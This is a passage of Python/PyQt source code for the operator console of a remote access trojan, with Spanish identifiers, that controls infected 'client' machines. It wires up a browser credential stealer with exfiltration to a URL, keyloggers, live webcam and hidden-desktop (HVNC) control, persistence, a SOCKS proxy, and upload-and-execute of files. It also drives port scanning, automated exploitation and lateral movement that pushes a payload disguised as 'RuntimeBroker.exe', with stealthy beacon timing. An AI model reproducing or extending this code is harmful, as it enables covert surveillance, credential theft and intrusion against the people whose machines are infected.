    def _append_stealer(self, t):
        if hasattr(self, "out_stealer") and self.out_stealer is not None:
            self.out_stealer.appendPlainText(t)

    def _refrescar_conteo(self):
        self.lbl_n.setText(str(len(self.clientes)))

    # ================================================================= filtros
    def _on_filtro_so(self):
        self._filtro_so = self.cmb_filtro_so.currentData() or ""
        self._aplicar_filtros()

    def _aplicar_filtros(self):
        """Aplica filtro de texto + filtro por SO (RF10)."""
        texto = self.in_buscar.text().lower().strip()
        for i in range(self.tree.topLevelItemCount()):
            it = self.tree.topLevelItem(i)
            cid = it.data(0, Qt.ItemDataRole.UserRole)
            info = self.clientes.get(cid, {}).get("info", {})
            plataforma = (info.get("plataforma") or "").lower()
            ok_texto = (not texto) or any(
                texto in it.text(c).lower() for c in range(1, len(COLS)))
            ok_so = (not self._filtro_so) or plataforma == self._filtro_so
            it.setHidden(not (ok_texto and ok_so))

    def _filtrar(self, _texto=None):
        self._aplicar_filtros()

    def _ordenar_por_so(self):
        """Reordena el árbol agrupando por SO (Windows → Linux → macOS → Android)."""
        items = [self.tree.takeTopLevelItem(0)
                 for _ in range(self.tree.topLevelItemCount())]

        def clave(it):
            cid = it.data(0, Qt.ItemDataRole.UserRole)
            plat = (self.clientes.get(cid, {}).get("info", {})
                    .get("plataforma") or "zzz").lower()
            return (ORDEN_SO.get(plat, 9), it.text(2).lower())

        for it in sorted(items, key=clave):
            self.tree.addTopLevelItem(it)
        self._aplicar_filtros()
        self._log("[clientes] ordenados por SO")

    def _mostrar_detalles(self):
        it = self.tree.currentItem()
        for v in self.det_labels.values():
            v.setText("—")
        if not it:
            return
        cid = it.data(0, Qt.ItemDataRole.UserRole)
        info = self.clientes.get(cid, {}).get("info", {})
        for clave, lab in self.det_labels.items():
            lab.setText(str(info.get(clave, "—")))
        if cid in self.clientes:
            self.lbl_pivote.setText(self.clientes[cid]["item"].text(2) + f" ({cid[:8]})")

    def _ping_todos(self):
        for cid in list(self.clientes):
            ts = time.time()
            self._pings[cid] = ts
            self.servidor.enviar_comando(cid, "ping", {"ts": ts})

    # ================================================================= stealer
    def _cid_sel(self):
        it = self.tree.currentItem()
        return it.data(0, Qt.ItemDataRole.UserRole) if it else None

    def _stealer_recolectar(self):
        cid = self._cid_sel()
        if not cid:
            QMessageBox.information(self, "Stealer", "Selecciona un cliente.")
            return
        args = {k: c.isChecked() for k, c in self.st_chk.items()}
        args["url"] = self.in_st_url.text().strip()
        self._enviar_comando(cid, "stealer_recolectar", args)
        self._append_stealer(f"[{cid[:8]}] recolección iniciada...")

    def _stealer_estado(self):
        cid = self._cid_sel()
        if cid:
            self._enviar_comando(cid, "stealer_estado")

    def _stealer_traer(self):
        cid = self._cid_sel()
        if not cid:
            return
        self._enviar_comando(cid, "stealer_paquete")

    def _stealer_exfil(self):
        cid = self._cid_sel()
        if not cid:
            return
        url = self.in_st_url.text().strip()
        if not url:
            QMessageBox.information(self, "Stealer", "Indica una URL de exfiltración.")
            return
        self._enviar_comando(cid, "stealer_exfil", {"url": url})

    def _stealer_auto(self):
        cid = self._cid_sel()
        if not cid:
            return
        self._enviar_comando(cid, "stealer_auto", {
            "on": True, "url": self.in_st_url.text().strip(),
            "intervalo": int(self.in_st_int.text() or 900)})

    def _stealer_msg(self, cid, cmd, datos):
        if cmd == "stealer_estado":
            self._append_stealer(
                f"[{cid[:8]}] fase={datos.get('fase')} prog={datos.get('prog')} "
                f"activo={datos.get('activo')} auto={datos.get('auto')} "
                f"zip={datos.get('zip')}")
        elif cmd == "stealer_paquete":
            b64 = datos.get("b64", "")
            if not b64:
                self._append_stealer(f"[{cid[:8]}] sin paquete: {datos.get('error')}")
                return
            ruta, _ = QFileDialog.getSaveFileName(
                self, "Guardar paquete", datos.get("nombre", "stealer.zip"), "ZIP (*.zip)")
            if ruta:
                with open(ruta, "wb") as f:
                    f.write(base64.b64decode(b64))
                self._append_stealer(f"[{cid[:8]}] paquete guardado en {ruta} "
                                     f"({datos.get('tamano')} bytes)")
        else:
            self._append_stealer(f"[{cid[:8]}] {cmd}: "
                                 + json.dumps(datos, ensure_ascii=False))

    # ================================================================= recon
    def _recon(self, cmd, args=None):
        cid = self._cid_sel()
        if not cid:
            QMessageBox.information(self, "Recon", "Selecciona un cliente.")
            return
        self.out_beacon.appendPlainText(f"[→] {cmd} {args or ''}")
        self._enviar_comando(cid, cmd, args or {})

    def _beacon_msg(self, cid, cmd, datos):
        if cmd == "portscan":
            abiertos = datos.get("abiertos", [])
            self.out_beacon.appendPlainText(
                f"[{cid[:8]}] escaneo {datos.get('objetivo')}: {len(abiertos)} abiertos\n"
                + "\n".join(abiertos) + "\n")
        elif "salida" in datos:
            self.out_beacon.appendPlainText(f"[{cid[:8]}] {cmd}:\n{datos['salida']}\n")
        else:
            self.out_beacon.appendPlainText(f"[{cid[:8]}] {cmd}: {datos}\n")

    # ================================================================= contexto
    def _menu_contexto(self, pos):
        """Menú contextual construido SEGÚN el SO y las capacidades reales del
        agente (RF11). Lo que el agente no soporta no se muestra, en lugar de
        fallar al pulsarlo."""
        it = self.tree.itemAt(pos)
        if not it:
            return
        cid = it.data(0, Qt.ItemDataRole.UserRole)
        info = self.clientes.get(cid, {}).get("info", {})
        plataforma = (info.get("plataforma") or "").lower()
        caps = info.get("caps") or {}

        def puede(cap):
            if not caps:
                return True     # agente antiguo sin caps: mostramos todo
            return bool(caps.get(cap))

        m = QMenu(self)

        def add(txt, fn, cap=None):
            if cap and not puede(cap):
                return
            a = QAction(txt, self)
            a.triggered.connect(fn)
            m.addAction(a)

        def sep(titulo):
            if m.actions():
                m.addSeparator()
            m.addSection(titulo)

        # ---------------------------- GENÉRICO ---------------------------
        sep("Genérico")
        add("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo"))
        add("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos"))
        add("🖥  Terminal", lambda: self._abrir_terminal(cid), "shell")
        add("📋  Portapapeles: traer", lambda: self._enviar_comando(cid, "clip_get"),
            "portapapeles")
        add("📥  Portapapeles: enviar",
            lambda: self._pedir_y(cid, "clip_set", "Texto", ""), "portapapeles")
        add("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid), "captura")
        add("⬇️  Descargar archivo", lambda: self._abrir_explorador(cid), "archivos")
        add("⬆️  Subir y ejecutar (del RAT)", lambda: self._subir_ejecutar(cid), "archivos")
        add("🌍  Iniciar proxy SOCKS5 (:1080)",
            lambda: self._enviar_comando(cid, "proxy_iniciar", {"puerto": 1080}), "proxy")
        add("🌍  Parar proxy SOCKS5", lambda: self._enviar_comando(cid, "proxy_parar"),
            "proxy")
        add("🌐  Abrir URL", lambda: self._pedir_y(cid, "abrir_url", "URL", "https://"),
            "abrir_url")
        add("💬  Mensaje", lambda: self._pedir_y(cid, "mensaje", "Texto", "Hola"), "mensaje")

        # ---------------------------- WINDOWS ----------------------------
        if plataforma == "windows":
            sep("Windows")
            add("🖥  Escritorio remoto (control)", lambda: self._abrir_escritorio(cid),
                "stream")
            add("🎞  Galería de capturas", lambda: self._abrir_galeria(cid))
            add("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid), "hvnc")
            add("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid),
                "archivos")
            add("📷  Webcam en vivo", lambda: self._abrir_webcam(cid), "webcam")
            add("⌨️  Keylogger iniciar",
                lambda: self._enviar_comando(cid, "keylogger_iniciar"), "keylogger")
            add("📜  Keylogger leer",
                lambda: self._enviar_comando(cid, "keylogger_leer"), "keylogger")
            add("🖱  Cambiar botones del ratón (swap)",
                lambda: self._enviar_comando(cid, "swap_raton"), "raton")
            add("🕵  Stealer: recolectar", lambda: self._stealer_recolectar_cid(cid),
                "stealer_navegadores")
            add("🕵  Stealer: traer paquete", lambda: self._stealer_traer_cid(cid))
            add("🔓  Persistencia", lambda: self._enviar_comando(cid, "persistir"),
                "persistencia")
            add("📶  Perfiles Wi-Fi", lambda: self._enviar_comando(cid, "wifi_perfiles"),
                "wifi")
            add("🛡  Servicios en ejecución", lambda: self._enviar_comando(cid, "wmi"))
            add("🔐  Privilegios / UAC",
                lambda: self._enviar_comando(cid, "privilegios"), "privilegios")
            add("🔒  Bloquear/Desbloquear entrada",
                lambda: self._enviar_comando(cid, "bloquear_entrada"), "bloquear")
            add("⏻  Apagar", lambda: self._energia(cid, "apagar"), "energia")
            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")
            add("🚪  Cerrar sesión", lambda: self._energia(cid, "logoff"), "energia")

        # -------------------------- LINUX / MACOS ------------------------
        elif plataforma in ("linux", "macos"):
            sep("Linux / macOS")
            add("📸  Captura de pantalla (stream)",
                lambda: self._abrir_escritorio(cid), "stream")
            add("🎞  Galería de capturas", lambda: self._abrir_galeria(cid))
            add("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid),
                "archivos")
            add("⌨️  Keylogger iniciar",
                lambda: self._enviar_comando(cid, "keylogger_iniciar"), "keylogger")
            add("📜  Keylogger leer",
                lambda: self._enviar_comando(cid, "keylogger_leer"), "keylogger")
            add("🔓  Persistencia (systemd/cron)",
                lambda: self._enviar_comando(cid, "persistir"), "persistencia")
            add("📶  Perfiles Wi-Fi", lambda: self._enviar_comando(cid, "wifi_perfiles"),
                "wifi")
            add("🔐  Privilegios / sudo",
                lambda: self._enviar_comando(cid, "privilegios"), "privilegios")
            add("📦  Paquetes instalados",
                lambda: self._enviar_comando(cid, "shell",
                                             {"comando": "dpkg -l 2>/dev/null | head -100"}))
            add("⏻  Apagar", lambda: self._energia(cid, "apagar"), "energia")
            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")

        # ---------------------------- ANDROID ---------------------------
        elif plataforma == "android":
            sep("Android")
            add("📱  Móvil (Android / Termux)", lambda: self._abrir_movil(cid), "movil")
            add("📸  Captura de pantalla", lambda: self._screenshot(cid), "captura")
            add("🖥  Shell Termux", lambda: self._abrir_terminal(cid), "shell")
            add("🔔  Notificaciones",
                lambda: self._enviar_comando(cid, "movil_notif_list"), "movil")
            add("📍  Ubicación", lambda: self._enviar_comando(cid, "movil_ubicacion"),
                "movil")
            add("📡  Sensores", lambda: self._enviar_comando(cid, "movil_sensores",
                                                            {"listar": True}), "movil")
            add("💬  SMS", lambda: self._enviar_comando(cid, "movil_sms", {"limite": 50}),
                "movil")
            add("📦  Apps instaladas",
                lambda: self._enviar_comando(cid, "movil_apps", {"tipo": "usuario"}), "movil")
            add("📶  WiFi actual", lambda: self._enviar_comando(cid, "movil_wifi"), "movil")
            add("🔓  Persistencia Termux:Boot",
                lambda: self._enviar_comando(cid, "movil_persistir"), "persistencia")
            add("🔓  Comprobar root", lambda: self._enviar_comando(cid, "movil_root"),
                "movil")
            add("🔋  Batería", lambda: self._enviar_comando(cid, "movil_bateria"), "movil")
            add("🔄  Reiniciar", lambda: self._energia(cid, "reiniciar"), "energia")

        # ---------------------------- cierre ----------------------------
        if m.actions():
            m.addSeparator()
        a = QAction("❌  Desconectar", self)
        a.triggered.connect(lambda: self._enviar_comando(cid, "desconectar"))
        m.addAction(a)

        m.exec(self.tree.viewport().mapToGlobal(pos))

    def _energia(self, cid, modo):
        self._enviar_comando(cid, "energia", {"modo": modo})

    def _stealer_recolectar_cid(self, cid):
        args = {k: c.isChecked() for k, c in self.st_chk.items()}
        args["url"] = self.in_st_url.text().strip()
        self._enviar_comando(cid, "stealer_recolectar", args)
        self._ir_tab(self.w_stealer)

    def _stealer_traer_cid(self, cid):
        self._enviar_comando(cid, "stealer_paquete")

    def _enviar_comando(self, cid, cmd, args=None):
        if cid not in self.clientes:
            return
        self.servidor.enviar_comando(cid, cmd, args or {})
        if cmd not in CMDS_SILENCIOSOS:
            self._log(f"[→] '{cmd}' a {cid[:8]}")

    def _pedir_y(self, cid, cmd, etiqueta, defecto):
        texto, ok = QInputDialog.getText(self, cmd, etiqueta + ":", text=defecto)
        if ok:
            clave = {"abrir_url": "url", "mensaje": "texto", "clip_set": "texto"}[cmd]
            self._enviar_comando(cid, cmd, {clave: texto})

    def _abrir_terminal(self, cid):
        if cid not in self.clientes:
            return
        dlg = TerminalDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.dialogs_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_escritorio(self, cid):
        if cid not in self.clientes:
            return
        dlg = EscritorioDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.escritorios_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_galeria(self, cid):
        if cid not in self.clientes:
            return
        GaleriaDialog(self._carpeta_capturas(cid), self).exec()

    def _abrir_hvnc(self, cid):
        if cid not in self.clientes:
            return
        dlg = HvncDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.hvnc_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_webcam(self, cid):
        if cid not in self.clientes:
            return
        dlg = WebcamDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.webcams_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_explorador(self, cid):
        if cid not in self.clientes:
            return
        dlg = ExploradorRemotoDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.exploradores_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_movil(self, cid):
        if cid not in self.clientes:
            return
        dlg = MovilDialog(cid, self.clientes[cid]["item"].text(2),
                          info=self.clientes[cid]["info"], parent=self)
        self.movil_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _movil_msg(self, cid, cmd, datos):
        """Reenvia una respuesta movil_* al dialogo movil de ese cliente."""
        datos = datos or {}
        for dlg in self.movil_por_cid.get(cid, []):
            try:
                if datos.get("error") and not datos.get("b64"):
                    dlg._sig_datos.emit(cmd, datos)
                elif cmd == "movil_pantalla":
                    dlg._sig_pantalla.emit(datos.get("b64", ""),
                                           int(datos.get("w") or 0),
                                           int(datos.get("h") or 0))
                elif cmd == "movil_camara":
                    dlg._sig_camara.emit(datos.get("b64", ""),
                                         int(datos.get("w") or 0),
                                         int(datos.get("h") or 0))
                else:
                    dlg._sig_datos.emit(cmd, datos)
            except Exception:
                pass

    def _enrutar_frame(self, cid, datos):
        b64 = datos.get("b64", "")
        if not b64:
            return
        if cid in self._screenshot_pend:
            try:
                carpeta = self._screenshot_pend.pop(cid)
                nombre = f"manual_{time.strftime('%Y%m%d_%H%M%S')}.png"
                destino = os.path.join(carpeta, nombre)
                with open(destino, "wb") as f:
                    f.write(base64.b64decode(b64))
                self._log(f"[screenshot] guardado: {destino}")
            except Exception as e:
                self._log(f"[screenshot] error: {e}")
        for dlg in self.escritorios_por_cid.get(cid, []):
            try:
                pm = QPixmap()
                pm.loadFromData(base64.b64decode(b64))
                if not pm.isNull():
                    dlg.set_frame(pm, datos.get("w", 1920), datos.get("h", 1080))
            except Exception:
                pass

    def _enrutar_hvnc(self, cid, datos):
        b64 = datos.get("b64", "")
        if not b64:
            return
        for dlg in self.hvnc_por_cid.get(cid, []):
            try:
                pm = QPixmap()
                pm.loadFromData(base64.b64decode(b64))
                dlg.set_frame(pm, datos.get("w", 1200), datos.get("h", 800))
            except Exception:
                pass

    def _enrutar_webcam(self, cid, datos):
        for dlg in self.webcams_por_cid.get(cid, []):
            try:
                raw = base64.b64decode(datos.get("b64", ""))
                pm = QPixmap()
                pm.loadFromData(raw)
                dlg.set_frame(pm, datos.get("w", 640), datos.get("h", 480))
            except Exception:
                pass

    def _descargar(self, cid):
        self._abrir_explorador(cid)

    def _descargar_remoto(self, cid, ruta):
        self._enviar_comando(cid, "descargar", {"ruta": ruta})

    def _guardar_descarga(self, cid, datos):
        b64 = datos.get("b64", "")
        if not b64:
            self._log(f"[descarga] sin datos: {datos.get('error')}")
            return
        carpeta = os.path.join(os.path.expanduser("~"), "JaguarDescargas")
        os.makedirs(carpeta, exist_ok=True)
        destino = os.path.join(carpeta, datos.get("nombre", "archivo.bin"))
        with open(destino, "wb") as f:
            f.write(base64.b64decode(b64))
        self._log(f"[descarga] guardado en {destino} ({datos.get('tamano')} bytes)")

    def _screenshot(self, cid):
        carpeta = self._carpeta_capturas(cid)
        self._screenshot_pend[cid] = carpeta
        self._enviar_comando(cid, "captura", {"formato": "png"})

    def _subir_ejecutar(self, cid):
        ruta, _ = QFileDialog.getOpenFileName(self, "Subir y ejecutar (desde el RAT)")
        if not ruta:
            return
        with open(ruta, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        self._enviar_comando(cid, "subir_ejecutar",
                             {"nombre": os.path.basename(ruta), "b64": b64})

    # ================================================================= escaner
    def _escanear(self):
        objetivo = self.in_objetivo.text().strip()
        puertos = self.in_puertos.text().strip()
        usar_nmap = self.chk_nmap.isChecked()
        self.res_escaner.clear()
        self.barra.setValue(0)
        self.btn_escanear.setEnabled(False)

        def worker():
            try:
                res = escaner.escanear(objetivo, puertos,
                                       progreso=lambda v: self._sig_escaneo_prog.emit(v),
                                       usar_nmap=usar_nmap)
            except Exception as e:
                self._sig_nse.emit(f"[escáner] ERROR: {e}")
                res = []
            self._sig_escaneo_fin.emit(res)
        threading.Thread(target=worker, daemon=True).start()

    def _escanear_wifi(self):
        """Va a la pestaña Wi-Fi si existe; si no, abre el diálogo clásico."""
        if self.panel_wifi is not None:
            self._ir_tab(self.panel_wifi)
            return
        if not wifi_ofensivo_hay_stack():
            QMessageBox.information(
                self, "Wi-Fi",
                "Falta el stack 802.11 (aircrack-ng / airodump-ng / aireplay-ng / iw).\n"
                "El escáner IP sigue funcionando sin él.")
            return
        if WifiOfensivoDialog is None:
            return
        self._wifi_dlg = WifiOfensivoDialog(self)
        self._wifi_dlg.show()

    # ------------------------------------------------------- puente Wi-Fi (RF8)
    def _on_subred_wifi(self, subred):
        """La pestaña Wi-Fi ha detectado la subred. Se rellena el Escáner."""
        if not subred:
            return
        self.in_objetivo.setText(subred)
        self._ir_tab(self.w_escaner)
        if self.ultimo_escaneo:
            r = QMessageBox.question(
                self, "Escáner",
                f"Ya hay un escaneo previo ({len(self.ultimo_escaneo)} host(s)).\n"
                f"¿Reemplazarlo escaneando {subred}?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if r != QMessageBox.StandardButton.Yes:
                return
        self._log(f"[wifi] subred recibida -> {subred}")
        if self.panel_wifi is not None and self.panel_wifi.lanzar_al_enviar:
            self._escanear()

    def _detalle_host(self, item):
        """Doble clic en un host: puertos, servicio y banner de ese host."""
        ip = item.text(0)
        self.lbl_hostdet.setText(f"Host {ip} — detalle de puertos")
        lineas = []
        for i in range(self.res_escaner.topLevelItemCount()):
            it = self.res_escaner.topLevelItem(i)
            if it.text(0) != ip:
                continue
            lineas.append(f"  {it.text(2):>6}/tcp  {it.text(3):<16} {it.text(4)}")
        if not lineas:
            self.out_hostdet.setPlainText(f"{ip}: sin puertos registrados")
            return
        self.out_hostdet.setPlainText(
            f"{ip}\n" + "─" * 60 + "\n" + "\n".join(sorted(lineas)))

    def _on_escaneo_prog(self, v):
        self.barra.setValue(v)

    def _on_escaneo_fin(self, res):
        self.btn_escanear.setEnabled(True)
        self.ultimo_escaneo = res or []
        self.barra.setValue(100)
        for d in self.ultimo_escaneo:
            for p in d.get("puertos", []):
                QTreeWidgetItem(self.res_escaner,
                                [d["ip"], d.get("host", ""), str(p["puerto"]),
                                 p.get("servicio", "?"), p.get("banner", "")])
        self._log(f"[escáner] {len(self.ultimo_escaneo)} host(s) con puertos abiertos")
        self._refrescar_botones_escaner()

    def _rec_de_fila_escaner(self):
        """Construye una recomendación a partir de la fila del Escáner."""
        it = self.res_escaner.currentItem()
        if not it:
            return None
        try:
            puerto = int(it.text(2))
        except (TypeError, ValueError):
            return None
        for r in exploits.recomendar(self.ultimo_escaneo):
            if r["ip"] == it.text(0) and r["puerto"] == puerto:
                return r
        return None

    def _refrescar_botones_escaner(self):
        r = self._rec_de_fila_escaner()
        if hasattr(self, "btn_nativo"):
            tiene = bool(r and exploits.tiene_nativo(r["puerto"]))
            self.btn_nativo.setEnabled(tiene)
            if r and not tiene:
                self.btn_nativo.setToolTip(
                    f"El puerto {r['puerto']} no tiene explotador nativo; "
                    "usa 'Lanzar en cliente' o 'Copiar comando'.")
            elif not r:
                self.btn_nativo.setToolTip("Selecciona un puerto ya recomendado.")
            else:
                self.btn_nativo.setToolTip(f"Ejecuta el explotador nativo de {r['nombre']}.")

    def _verificar_nse(self):
        """Ejecuta el script NSE del exploit seleccionado (RF9)."""
        rec = self._rec_actual() or self._rec_de_fila_escaner()
        if not rec:
            QMessageBox.information(
                self, "Verificar",
                "Selecciona un puerto (Escáner) o un exploit recomendado "
                "(Exploits) primero.")
            return
        cmd = exploits.comando_nmap(rec)
        if not shutil.which("nmap"):
            self._append_nativo("[nmap] no está instalado; comando de referencia:")
            self._append_nativo(cmd)
            QApplication.clipboard().setText(cmd)
            return
        self._append_nativo(f"[nmap] $ {cmd}")

        def worker():
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True,
                                   text=True, timeout=300)
                salida = ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                salida = f"[nmap] error: {e}"
            self._sig_nse.emit(salida[-4000:] or "[nmap] sin salida")
        threading.Thread(target=worker, daemon=True).start()

    def _explotar_nativo(self):
        rec = self._rec_de_fila_escaner()
        if not rec:
            it = self.res_escaner.currentItem()
            if not it:
                QMessageBox.information(self, "Nativo", "Selecciona un puerto escaneado.")
                return
            ip, puerto = it.text(0), int(it.text(2))
        else:
            ip, puerto = rec["ip"], rec["puerto"]
        if not exploits.tiene_nativo(puerto):
            QMessageBox.information(
                self, "Nativo",
                f"El puerto {puerto} no tiene explotador nativo todavía.")
            return
        self.out_nativo.appendPlainText(f"[*] explotando {ip}:{puerto} ...")

        def worker():
            try:
                r = explotadores.explotar(ip, puerto, lhost=escaner.ip_local())
                self._sig_nativo.emit(f"[{r.metodo}] ok={r.ok}\n{r.salida or r.error}\n")
            except Exception as e:
                self._sig_nativo.emit(f"[nativo] error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def _desplegar_agente(self):
        """Despliega el payload en un host por movimiento lateral (RF9).

        Si hay un cliente seleccionado se usa como pivote (técnica elegida en
        la pestaña Lateral). Si no, se copia el comando al portapapeles.
        """
        rec = self._rec_de_fila_escaner() or self._rec_actual()
        target = ""
        if rec:
            target = rec["ip"]
        if not target:
            target = self.in_lat_target.text().strip()
        if not target:
            QMessageBox.information(
                self, "Desplegar", "Selecciona un host del Escáner o indica "
                "un destino en la pestaña Lateral.")
            return
        self.in_lat_target.setText(target)
        self._lateral_autourl()
        url = self.in_lat_url.text().strip()
        tecnica = self.cb_lat_tecnica.currentText()
        try:
            cmd = lateral.comando_completo(
                tecnica, target, url,
                usuario=self.in_lat_user.text().strip(),
                password=self.in_lat_pass.text())
        except Exception as e:
            QMessageBox.warning(self, "Desplegar", str(e))
            return
        self._ir_tab(self.w_lateral)
        self.out_lateral.appendPlainText(f"[*] {tecnica} -> {target}\n$ {cmd}\n")
        cid = self._cid_sel()
        if cid:
            self._enviar_comando(cid, "shell", {"comando": cmd})
            self._log(f"[lateral] desplegando en {target} vía {cid[:8]}")
        else:
            QApplication.clipboard().setText(cmd)
            self._log(f"[lateral] sin pivote: comando de {target} copiado")

    def _recomendar_desde_escaneo(self):
        if not self.ultimo_escaneo:
            QMessageBox.information(self, "Exploits", "Escanea primero.")
            return
        recs = exploits.recomendar(self.ultimo_escaneo)
        self.tree_exploits.clear()
        for r in recs:
            QTreeWidgetItem(self.tree_exploits,
                            [r["ip"], str(r["puerto"]), r["nombre"], r["cve"],
                             r["riesgo"], r["so"], r["cmd"]])
        self._ir_tab(self.w_exploits)
        self._log(f"[exploits] {len(recs)} recomendación(es)")

    def _rec_actual(self):
        it = self.tree_exploits.currentItem()
        if not it:
            return None
        for r in exploits.recomendar(self.ultimo_escaneo):
            if r["ip"] == it.text(0) and str(r["puerto"]) == it.text(1):
                return r
        return None

    def _refrescar_botones_exploits(self):
        r = self._rec_actual()
        if r and not exploits.tiene_nativo(r["puerto"]):
            self._log(f"[exploits] {r['nombre']}: sin explotador nativo")

    def _lanzar_exploit(self):
        r = self._rec_actual()
        if not r:
            QMessageBox.information(self, "Exploit", "Selecciona un exploit.")
            return
        sel = self.tree.currentItem()
        if sel:
            self._enviar_comando(sel.data(0, Qt.ItemDataRole.UserRole),
                                 "shell", {"comando": exploits.comando_para(r)})
        else:
            QMessageBox.information(self, "Exploit", exploits.comando_para(r))

    def _copiar_exploit(self):
        r = self._rec_actual() or self._rec_de_fila_escaner()
        if r:
            QApplication.clipboard().setText(exploits.comando_para(r))
            self._log("[exploits] comando copiado")

    def _copiar_deteccion(self):
        r = self._rec_actual() or self._rec_de_fila_escaner()
        if r:
            QApplication.clipboard().setText(exploits.comando_nmap(r))
            self._log("[exploits] detección nmap copiada")

    def _ejecutar_exploit_nativo(self):
        r = self._rec_actual()
        if not r:
            QMessageBox.information(self, "Exploit", "Selecciona un exploit.")
            return
        if not exploits.tiene_nativo(r["puerto"]):
            QMessageBox.information(
                self, "Exploit",
                f"El puerto {r['puerto']} no tiene explotador nativo. "
                "Usa 'Lanzar en cliente' o 'Copiar comando'.")
            return
        self.out_exploits.appendPlainText(f"[*] explotando {r['ip']}:{r['puerto']} ...")

        def worker():
            try:
                res = exploits.ejecutar_nativo(r, lhost=escaner.ip_local())
                self._sig_nativo.emit(f"[{res.metodo}] ok={res.ok}\n{res.salida or res.error}\n")
            except Exception as e:
                self._sig_nativo.emit(f"[nativo] error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    # ================================================================= lateral
    def _lateral_autourl(self):
        host = self.in_bhost.text().strip() or escaner.ip_local()
        puerto = self.in_bhttp.text().strip() or "8080"
        nombre = self.in_bnombre.text().strip() or "RuntimeBroker"
        exe = nombre + (".exe" if os.name == "nt" else "")
        self.in_lat_url.setText(f"http://{host}:{puerto}/{exe}")

    def _lateral_jump(self):
        cid = self._cid_sel()
        if not cid:
            QMessageBox.information(self, "Lateral", "Selecciona el cliente pivote.")
            return
        target = self.in_lat_target.text().strip()
        url = self.in_lat_url.text().strip()
        if not target or not url:
            QMessageBox.information(self, "Lateral", "Faltan host destino o URL del payload.")
            return
        tecnica = self.cb_lat_tecnica.currentText()
        try:
            cmd = lateral.comando_completo(
                tecnica, target, url,
                usuario=self.in_lat_user.text().strip(),
                password=self.in_lat_pass.text())
        except Exception as e:
            QMessageBox.warning(self, "Lateral", str(e))
            return
        self.out_lateral.appendPlainText(f"[*] {tecnica} -> {target}\n$ {cmd}\n")
        self._enviar_comando(cid, "shell", {"comando": cmd})

    def _lateral_limpiar(self):
        cid = self._cid_sel()
        if not cid:
            return
        cmd = lateral.limpiar(self.cb_lat_tecnica.currentText(),
                              self.in_lat_target.text().strip())
        if cmd:
            self.out_lateral.appendPlainText(f"[*] limpieza\n$ {cmd}\n")
            self._enviar_comando(cid, "shell", {"comando": cmd})

    # ================================================================= beacon
    def _beacon_sel(self):
        it = self.tree.currentItem()
        if not it:
            QMessageBox.information(self, "Beacon", "Selecciona un cliente.")
            return
        self._aplicar_beacon(it.data(0, Qt.ItemDataRole.UserRole))

    def _beacon_todos(self):
        for cid in list(self.clientes):
            self._aplicar_beacon(cid)

    def _beacon_sigiloso(self):
        """Beacon discreto a todos: sleep alto y jitter alto."""
        self.in_sleep.setText("45")
        self.in_jitter.setText("35")
        self._beacon_todos()

    def _beacon_quitar(self):
        it = self.tree.currentItem()
        cid = it.data(0, Qt.ItemDataRole.UserRole) if it else None
        if not cid:
            return
        self.servidor.enviar_beacon(cid, 5.0, 20)
        if cid in self.clientes:
            self.clientes[cid]["beacon"] = None
        self._log(f"[beacon] {cid[:8]} -> modo normal")
        self._beacon_refrescar()

    def _aplicar_beacon(self, cid):
        try:
            sleep = float(self.in_sleep.text() or 5)
            jitter = int(self.in_jitter.text() or 20)
        except ValueError:
            QMessageBox.warning(self, "Beacon", "Sleep y jitter deben ser numéricos.")
            return
        self.servidor.enviar_beacon(cid, sleep, jitter)
        if cid in self.clientes:
            self.clientes[cid]["beacon"] = (sleep, jitter)
        self._log(f"[beacon] {cid[:8]} -> sleep={sleep} jitter={jitter}%")
        self._beacon_refrescar()

    def _beacon_refrescar(self):
        """Refresca la tabla de beacons y la lista de clientes activos (RF13)."""
        self.tree_beacons.clear()
        self.lista_clientes.clear()
        for cid, d in self.clientes.items():
            b = d.get("beacon")
            info = d["info"]
            QTreeWidgetItem(self.tree_beacons,
                            [cid[:8], info.get("host", ""), info.get("ip", ""),
                             info.get("so", ""),
                             str(b[0]) if b else "-", str(b[1]) if b else "-",
                             "beacon activo" if b else "normal"])
            li = QListWidgetItem(
                f"{info.get('host', '?')}  ·  {info.get('ip', '?')}  ·  "
                f"{info.get('so', '?')}  ·  {'BEACON' if b else 'normal'}")
            li.setData(Qt.ItemDataRole.UserRole, cid)
            self.lista_clientes.addItem(li)

    def _seleccionar_desde_lista(self):
        """Selecciona en el árbol el cliente elegido en la lista de Beacons."""
        li = self.lista_clientes.currentItem()
        if not li:
            return
        cid = li.data(Qt.ItemDataRole.UserRole)
        if cid in self.clientes:
            self.tree.setCurrentItem(self.clientes[cid]["item"])
            self._mostrar_detalles()

    # ================================================================= builder
    def _buscar_icono(self):
        ruta, _ = QFileDialog.getOpenFileName(
            self, "Elegir icono", "",
            "Iconos e imágenes (*.ico *.png *.jpg *.jpeg *.bmp *.exe);;Todos (*.*)")
        if ruta:
            self.in_bicono.setText(ruta)

    def _buscar_upx(self):
        ruta = QFileDialog.getExistingDirectory(self, "Carpeta de UPX")
        if ruta:
            self.in_bupx.setText(ruta)

    def _hacer_constructor(self):
        comp = self.in_bcomp.currentText() if hasattr(self, "in_bcomp") else "pyinstaller"
